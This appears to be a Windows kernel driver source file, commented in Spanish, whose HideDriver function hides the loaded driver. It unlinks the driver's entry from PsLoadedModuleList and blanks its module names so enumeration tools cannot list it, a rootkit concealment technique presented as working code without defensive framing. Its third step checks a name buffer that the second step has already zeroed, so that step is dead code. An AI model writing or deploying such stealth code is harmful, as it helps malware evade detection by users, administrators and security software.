#include "hiding.h"
#include "common.h"

// BUG FIX: No sobrescribir toda la LDR_DATA_TABLE_ENTRY
// Solo remover de listas y limpiar nombres (no corromper enlaces)

void HideDriver() {
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)g_DeviceObject->DriverObject->DriverSection;
    if (!entry) return;

    // Paso 1: Remover de PsLoadedModuleList (InLoadOrderLinks)
    RemoveEntryList(&entry->InLoadOrderLinks);
    
    // Paso 2: Limpiar solo los nombres para que no aparezcan en enumeradores
    // IMPORTANTE: NO sobrescribir otros campos como InMemoryOrderLinks, etc.
    RtlZeroMemory(&entry->BaseDllName, sizeof(UNICODE_STRING));
    RtlZeroMemory(&entry->FullDllName, sizeof(UNICODE_STRING));
    
    // Paso 3: Limpiar el puntero al path completo si existe
    // (pero conservar la integridad de la estructura)
    if (entry->FullDllName.Buffer) {
        entry->FullDllName.Buffer = NULL;
        entry->FullDllName.Length = 0;
        entry->FullDllName.MaximumLength = 0;
    }
}


